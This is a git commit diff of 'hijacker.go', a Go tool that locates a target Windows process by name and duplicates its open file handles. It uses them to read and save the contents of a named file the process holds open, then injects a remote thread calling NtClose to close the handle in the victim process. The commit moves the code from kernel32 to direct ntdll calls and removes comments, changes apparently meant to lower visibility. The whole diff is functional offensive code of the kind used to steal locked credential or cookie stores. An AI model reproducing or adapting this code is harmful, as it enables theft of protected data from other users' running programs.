56ad9a54e4f66d7b946ac0b7049b15599c01f1f0
EvilBytecode <151552809+EvilBytecode@users.noreply.github.com>
2025-10-09 20:40:56 +0100

    Update hijacker.go
    rtl/nt full

--- hijacker.go
+++ hijacker.go
@@ -23,6 +23,7 @@ const (
 
 	statusMismatch = 0xC0000004
 	statusSuccess  = 0x00000000
+	statusNoMore   = 0x8000001A
 	queryInfo      = 0x0400
 	dupHandle      = 0x0040
 	handleClass    = 51
@@ -31,10 +32,10 @@ const (
 	diskType       = 1
 	createAlways   = 2
 	normalAttr     = 0x80
-	procSnapshot   = 0x00000002
 
 	fileStandardInfo = 5
 	filePositionInfo = 14
+	fileNameInfo     = 9
 
 	maxPath         = 32768
 	fileOpenIf      = 3
@@ -68,17 +69,30 @@ type WideStr struct {
 	Data  *uint16
 }
 
-type ProcInfo struct {
-	Sz     uint32
-	_      uint32
-	Id     uint32
-	Heap   uintptr
-	Mod    uint32
-	Thds   uint32
-	Parent uint32
-	Base   int32
-	Attrs  uint32
-	Name   [260]byte
+type SystemProcessInfo struct {
+	NextEntryOffset uint32
+	NumberOfThreads uint32
+	Reserved1       [48]byte
+	ImageName       WideStr
+	BasePriority    int32
+	UniqueProcessId uintptr
+	Reserved2       uintptr
+	HandleCount     uint32
+	SessionId       uint32
+	Reserved3       uintptr
+	PeakVirtualSize uintptr
+	VirtualSize     uintptr
+	Reserved4       uint32
+	PeakWorkingSet  uintptr
+	WorkingSet      uintptr
+	Reserved5       uintptr
+	QuotaPagedPool  uintptr
+	Reserved6       uintptr
+	QuotaNonPaged   uintptr
+	PagefileUsage   uintptr
+	PeakPagefile    uintptr
+	PrivateUsage    uintptr
+	Reserved7       [6]uintptr
 }
 
 type IoStatusBlock struct {
@@ -98,6 +112,11 @@ type FilePositionInfo struct {
 	CurrentByteOffset int64
 }
 
+type FileNameInfo struct {
+	FileNameLength uint32
+	FileName       [1]uint16
+}
+
 type ObjectAttributes struct {
 	Length                   uint32
 	RootDirectory            syscall.Handle
@@ -109,6 +128,7 @@ type ObjectAttributes struct {
 
 type winAPI struct {
 	queryProcess    *syscall.LazyProc
+	querySystem     *syscall.LazyProc
 	queryObject     *syscall.LazyProc
 	closeHandle     *syscall.LazyProc
 	readFile        *syscall.LazyProc
@@ -119,14 +139,11 @@ type winAPI struct {
 	createFile      *syscall.LazyProc
 	writeFile       *syscall.LazyProc
 	createThread    *syscall.LazyProc
-	createSnapshot  *syscall.LazyProc
-	nextProcess     *syscall.LazyProc
-	getFilePath     *syscall.LazyProc
-	getFileType     *syscall.LazyProc
 }
 
 var api = &winAPI{
 	queryProcess:    syscall.NewLazyDLL("ntdll.dll").NewProc("NtQueryInformationProcess"),
+	querySystem:     syscall.NewLazyDLL("ntdll.dll").NewProc("NtQuerySystemInformation"),
 	queryObject:     syscall.NewLazyDLL("ntdll.dll").NewProc("NtQueryObject"),
 	closeHandle:     syscall.NewLazyDLL("ntdll.dll").NewProc("NtClose"),
 	readFile:        syscall.NewLazyDLL("ntdll.dll").NewProc("NtReadFile"),
@@ -137,90 +154,99 @@ var api = &winAPI{
 	createFile:      syscall.NewLazyDLL("ntdll.dll").NewProc("NtCreateFile"),
 	writeFile:       syscall.NewLazyDLL("ntdll.dll").NewProc("NtWriteFile"),
 	createThread:    syscall.NewLazyDLL("ntdll.dll").NewProc("RtlCreateUserThread"),
-	createSnapshot:  syscall.NewLazyDLL("kernel32.dll").NewProc("CreateToolhelp32Snapshot"),
-	nextProcess:     syscall.NewLazyDLL("kernel32.dll").NewProc("Process32Next"),
-	getFilePath:     syscall.NewLazyDLL("kernel32.dll").NewProc("GetFinalPathNameByHandleW"),
-	getFileType:     syscall.NewLazyDLL("kernel32.dll").NewProc("GetFileType"),
 }
 
 func ScanProcesses(target string) (map[uint32][]Handle, error) {
 	procs := make(map[uint32][]Handle)
 
-	h, _, err := api.createSnapshot.Call(uintptr(procSnapshot), 0)
-	if h == 0 || h == ^uintptr(0) {
-		return nil, fmt.Errorf("snapshot failed: %v", err)
+	var bufLen uint32 = 1024 * 1024
+	var mem []byte
+	code := uint32(statusMismatch)
+
+	for code == statusMismatch {
+		mem = make([]byte, bufLen)
+		r, _, _ := api.querySystem.Call(5, uintptr(unsafe.Pointer(&mem[0])), uintptr(bufLen), uintptr(unsafe.Pointer(&bufLen)))
+		code = uint32(r)
 	}
-	defer api.closeHandle.Call(h)
 
-	info := ProcInfo{Sz: uint32(unsafe.Sizeof(ProcInfo{}))}
+	if code != statusSuccess {
+		return nil, fmt.Errorf("query system failed: %x", code)
+	}
 
+	offset := uint32(0)
 	for {
-		if ok, _, _ := api.nextProcess.Call(h, uintptr(unsafe.Pointer(&info))); ok == 0 {
+		if offset >= uint32(len(mem)) {
 			break
 		}
 
-		var name string
-		for i, c := range info.Name {
-			if c == 0 {
-				name = string(info.Name[:i])
-				break
-			}
-		}
+		info := (*SystemProcessInfo)(unsafe.Pointer(&mem[offset]))
 
-		if !strings.EqualFold(name, target) {
-			continue
-		}
+		if info.UniqueProcessId != 0 && info.ImageName.Data != nil {
+			sz := int(info.ImageName.Size / 2)
+			if sz > 0 && sz < 512 {
+				buf := (*[512]uint16)(unsafe.Pointer(info.ImageName.Data))[:sz:sz]
+				name := syscall.UTF16ToString(buf)
 
-		var clientId struct {
-			pid uintptr
-			tid uintptr
-		}
-		clientId.pid = uintptr(info.Id)
+				if strings.EqualFold(name, target) {
+					pid := uint32(info.UniqueProcessId)
 
-		var objAttr ObjectAttributes
-		objAttr.Length = uint32(unsafe.Sizeof(objAttr))
+					var clientId struct {
+						pid uintptr
+						tid uintptr
+					}
+					clientId.pid = uintptr(pid)
 
-		var proc syscall.Handle
-		if r, _, _ := api.openProcess.Call(
-			uintptr(unsafe.Pointer(&proc)),
-			uintptr(queryInfo|dupHandle),
-			uintptr(unsafe.Pointer(&objAttr)),
-			uintptr(unsafe.Pointer(&clientId)),
-		); r != statusSuccess {
-			continue
-		}
+					var objAttr ObjectAttributes
+					objAttr.Length = uint32(unsafe.Sizeof(objAttr))
 
-		var bufLen uint32
-		var mem []byte
-		code := uint32(statusMismatch)
+					var proc syscall.Handle
+					if r, _, _ := api.openProcess.Call(
+						uintptr(unsafe.Pointer(&proc)),
+						uintptr(queryInfo|dupHandle),
+						uintptr(unsafe.Pointer(&objAttr)),
+						uintptr(unsafe.Pointer(&clientId)),
+					); r == statusSuccess {
 
-		for code == statusMismatch {
-			var p uintptr
-			if bufLen > 0 {
-				mem = make([]byte, bufLen)
-				p = uintptr(unsafe.Pointer(&mem[0]))
-			}
+						var hBufLen uint32
+						var hMem []byte
+						hCode := uint32(statusMismatch)
 
-			r, _, _ := api.queryProcess.Call(uintptr(proc), handleClass, p, uintptr(bufLen), uintptr(unsafe.Pointer(&bufLen)))
-			code = uint32(r)
-		}
+						for hCode == statusMismatch {
+							var p uintptr
+							if hBufLen > 0 {
+								hMem = make([]byte, hBufLen)
+								p = uintptr(unsafe.Pointer(&hMem[0]))
+							}
 
-		if code == statusSuccess && bufLen >= uint32(unsafe.Sizeof(Snapshot{})) {
-			snap := (*Snapshot)(unsafe.Pointer(&mem[0]))
-			n := snap.Total
+							r, _, _ := api.queryProcess.Call(uintptr(proc), handleClass, p, uintptr(hBufLen), uintptr(unsafe.Pointer(&hBufLen)))
+							hCode = uint32(r)
+						}
 
-			if n > 0 && bufLen >= uint32(unsafe.Sizeof(Snapshot{})+uintptr(n)*unsafe.Sizeof(Handle{})) {
-				off := unsafe.Sizeof(Snapshot{})
-				items := make([]Handle, n)
-				for i := uintptr(0); i < n; i++ {
-					src := (*Handle)(unsafe.Pointer(uintptr(unsafe.Pointer(&mem[0])) + off + i*unsafe.Sizeof(Handle{})))
-					items[i] = *src
+						if hCode == statusSuccess && hBufLen >= uint32(unsafe.Sizeof(Snapshot{})) {
+							snap := (*Snapshot)(unsafe.Pointer(&hMem[0]))
+							n := snap.Total
+
+							if n > 0 && hBufLen >= uint32(unsafe.Sizeof(Snapshot{})+uintptr(n)*unsafe.Sizeof(Handle{})) {
+								off := unsafe.Sizeof(Snapshot{})
+								items := make([]Handle, n)
+								for i := uintptr(0); i < n; i++ {
+									src := (*Handle)(unsafe.Pointer(uintptr(unsafe.Pointer(&hMem[0])) + off + i*unsafe.Sizeof(Handle{})))
+									items[i] = *src
+								}
+								procs[pid] = items
+							}
+						}
+
+						api.closeHandle.Call(uintptr(proc))
+					}
 				}
-				procs[info.Id] = items
 			}
 		}
 
-		api.closeHandle.Call(uintptr(proc))
+		if info.NextEntryOffset == 0 {
+			break
+		}
+		offset += info.NextEntryOffset
 	}
 
 	return procs, nil
@@ -248,7 +274,7 @@ func ExtractFile(hnd syscall.Handle, owner uint32, pattern string) ([]byte, stri
 	defer api.closeHandle.Call(uintptr(proc))
 
 	var dup syscall.Handle
-	self := ^uintptr(0) // this is called pseudohandle for current process (-1)
+	self := ^uintptr(0)
 
 	accessRights := fileReadData | fileWriteData | fileAppendData | fileReadEA | fileWriteEA | fileReadAttr | fileWriteAttr | readControl | synchronize
 	if r, _, _ := api.duplicateObject.Call(uintptr(proc), uintptr(hnd), self, uintptr(unsafe.Pointer(&dup)), uintptr(accessRights), 0, 0); r != statusSuccess {
@@ -291,58 +317,65 @@ func ExtractFile(hnd syscall.Handle, owner uint32, pattern string) ([]byte, stri
 		return nil, "", fmt.Errorf("wrong type: %s", kind)
 	}
 
-	if t, _, _ := api.getFileType.Call(uintptr(dup)); t != diskType {
-		return nil, "", fmt.Errorf("not disk file")
-	}
-
-	pathbuf := make([]uint16, maxPath)
-	r, _, _ := api.getFilePath.Call(uintptr(dup), uintptr(unsafe.Pointer(&pathbuf[0])), uintptr(len(pathbuf)), dosPath)
-	if r == 0 {
-		return nil, "", fmt.Errorf("path error")
-	}
-
-	fullpath := syscall.UTF16ToString(pathbuf)
-
-	sep := strings.LastIndex(fullpath, "\\")
-	if sep == -1 {
-		sep = strings.LastIndex(fullpath, "/")
-	}
-
-	var basename string
-	if sep == -1 {
-		basename = fullpath
-	} else {
-		basename = fullpath[sep+1:]
-	}
-
-	if !strings.EqualFold(basename, pattern) {
-		return nil, "", fmt.Errorf("no match: got %s, want %s", basename, pattern)
-	}
-
-	var stdInfo FileStandardInfo
+	var nameLen uint32 = 4096
+	nameBuf := make([]byte, nameLen)
 	var iosb IoStatusBlock
 
-	if r, _, _ := api.queryFileInfo.Call(uintptr(dup), uintptr(unsafe.Pointer(&iosb)), uintptr(unsafe.Pointer(&stdInfo)), unsafe.Sizeof(stdInfo), fileStandardInfo); r != statusSuccess {
-		return nil, fullpath, fmt.Errorf("size error: %x", r)
+	r, _, _ := api.queryFileInfo.Call(uintptr(dup), uintptr(unsafe.Pointer(&iosb)), uintptr(unsafe.Pointer(&nameBuf[0])), uintptr(nameLen), fileNameInfo)
+	if r != statusSuccess {
+		return nil, "", fmt.Errorf("path error: %x", r)
 	}
 
-	fsz := stdInfo.EndOfFile
-	if fsz == 0 {
-		return []byte{}, fullpath, nil
+	nameInfo := (*FileNameInfo)(unsafe.Pointer(&nameBuf[0]))
+	nameChars := int(nameInfo.FileNameLength / 2)
+	if nameChars > 0 {
+		namePtr := unsafe.Pointer(&nameInfo.FileName[0])
+		nameBuf16 := (*[32768]uint16)(namePtr)[:nameChars:nameChars]
+		fullpath := syscall.UTF16ToString(nameBuf16)
+
+		sep := strings.LastIndex(fullpath, "\\")
+		if sep == -1 {
+			sep = strings.LastIndex(fullpath, "/")
+		}
+
+		var basename string
+		if sep == -1 {
+			basename = fullpath
+		} else {
+			basename = fullpath[sep+1:]
+		}
+
+		if !strings.EqualFold(basename, pattern) {
+			return nil, "", fmt.Errorf("no match: got %s, want %s", basename, pattern)
+		}
+
+		var stdInfo FileStandardInfo
+		iosb = IoStatusBlock{}
+
+		if r, _, _ := api.queryFileInfo.Call(uintptr(dup), uintptr(unsafe.Pointer(&iosb)), uintptr(unsafe.Pointer(&stdInfo)), unsafe.Sizeof(stdInfo), fileStandardInfo); r != statusSuccess {
+			return nil, fullpath, fmt.Errorf("size error: %x", r)
+		}
+
+		fsz := stdInfo.EndOfFile
+		if fsz == 0 {
+			return []byte{}, fullpath, nil
+		}
+
+		var posInfo FilePositionInfo
+		posInfo.CurrentByteOffset = 0
+		api.setFileInfo.Call(uintptr(dup), uintptr(unsafe.Pointer(&iosb)), uintptr(unsafe.Pointer(&posInfo)), unsafe.Sizeof(posInfo), filePositionInfo)
+
+		content := make([]byte, fsz)
+		iosb = IoStatusBlock{}
+
+		if r, _, _ := api.readFile.Call(uintptr(dup), 0, 0, 0, uintptr(unsafe.Pointer(&iosb)), uintptr(unsafe.Pointer(&content[0])), uintptr(fsz), 0, 0); r != statusSuccess {
+			return nil, fullpath, fmt.Errorf("read error: %x", r)
+		}
+
+		return content[:iosb.Info], fullpath, nil
 	}
 
-	var posInfo FilePositionInfo
-	posInfo.CurrentByteOffset = 0
-	api.setFileInfo.Call(uintptr(dup), uintptr(unsafe.Pointer(&iosb)), uintptr(unsafe.Pointer(&posInfo)), unsafe.Sizeof(posInfo), filePositionInfo)
-
-	content := make([]byte, fsz)
-	iosb = IoStatusBlock{}
-
-	if r, _, _ := api.readFile.Call(uintptr(dup), 0, 0, 0, uintptr(unsafe.Pointer(&iosb)), uintptr(unsafe.Pointer(&content[0])), uintptr(fsz), 0, 0); r != statusSuccess {
-		return nil, fullpath, fmt.Errorf("read error: %x", r)
-	}
-
-	return content[:iosb.Info], fullpath, nil
+	return nil, "", fmt.Errorf("no filename")
 }
 
 func SaveFile(content []byte, dest string) error {
@@ -350,9 +383,9 @@ func SaveFile(content []byte, dest string) error {
 	if len(dest) >= 2 && dest[1] == ':' {
 		abspath = dest
 	} else {
+		rtlGetCurDir := syscall.NewLazyDLL("ntdll.dll").NewProc("RtlGetCurrentDirectory_U")
 		cwd := make([]uint16, 260)
-		getCwd := syscall.NewLazyDLL("kernel32.dll").NewProc("GetCurrentDirectoryW")
-		n, _, _ := getCwd.Call(uintptr(len(cwd)), uintptr(unsafe.Pointer(&cwd[0])))
+		n, _, _ := rtlGetCurDir.Call(uintptr(len(cwd)*2), uintptr(unsafe.Pointer(&cwd[0])))
 		if n == 0 {
 			return fmt.Errorf("failed to get current directory")
 		}
@@ -375,7 +408,7 @@ func SaveFile(content []byte, dest string) error {
 	var objAttr ObjectAttributes
 	objAttr.Length = uint32(unsafe.Sizeof(objAttr))
 	objAttr.ObjectName = &ustr
-	objAttr.Attributes = 0x40 // obj_case_insensitive
+	objAttr.Attributes = 0x40
 
 	var iosb IoStatusBlock
 	var h syscall.Handle
@@ -385,11 +418,11 @@ func SaveFile(content []byte, dest string) error {
 		uintptr(fileWriteData|fileAppendData|synchronize),
 		uintptr(unsafe.Pointer(&objAttr)),
 		uintptr(unsafe.Pointer(&iosb)),
-		0, 
+		0,
 		normalAttr,
-		0,          // shareAccess
-		5,          // file_overwrite_if
-		0x00000020, // file_synchronous_io_nonalert
+		0,
+		5,
+		0x00000020,
 		0,
 		0,
 	)
@@ -403,14 +436,14 @@ func SaveFile(content []byte, dest string) error {
 
 	r, _, _ = api.writeFile.Call(
 		uintptr(h),
-		0, // event
-		0, // apcroutine
-		0, // apccontext 
+		0,
+		0,
+		0,
 		uintptr(unsafe.Pointer(&iosb)),
 		uintptr(unsafe.Pointer(&content[0])),
 		uintptr(len(content)),
-		0, // byteoffset
-		0, // key
+		0,
+		0,
 	)
 
 	if r != statusSuccess {
@@ -431,7 +464,6 @@ func KillHandle(owner uint32, hnd syscall.Handle) error {
 	objAttr.Length = uint32(unsafe.Sizeof(objAttr))
 
 	var proc syscall.Handle
-	// Need process_create_thread (0x0002) for rtlcreateuserthread
 	processCreateThread := uint32(0x0002)
 	if r, _, _ := api.openProcess.Call(
 		uintptr(unsafe.Pointer(&proc)),
@@ -446,20 +478,17 @@ func KillHandle(owner uint32, hnd syscall.Handle) error {
 	fn := api.closeHandle.Addr()
 	var thd syscall.Handle
 
-	// Use RtlCreateUserThread
-	// params: Process, SecurityDescriptor, CreateSuspended, StackZeroBits,
-	// StackReserved, StackCommit, StartAddress, Parameter, Thread, ClientId
 	r, _, _ := api.createThread.Call(
 		uintptr(proc),
-		0,            // securydescritpor
-		0,            // createsuspnended
-		0,            // stackzerobits
-		0,            // stackreserved
-		0,            // stackcommit
-		fn,           // startaddr (NtClose)
-		uintptr(hnd), // param
+		0,
+		0,
+		0,
+		0,
+		0,
+		fn,
+		uintptr(hnd),
 		uintptr(unsafe.Pointer(&thd)),
-		0, // clientid
+		0,
 	)
 
 	if r != statusSuccess {
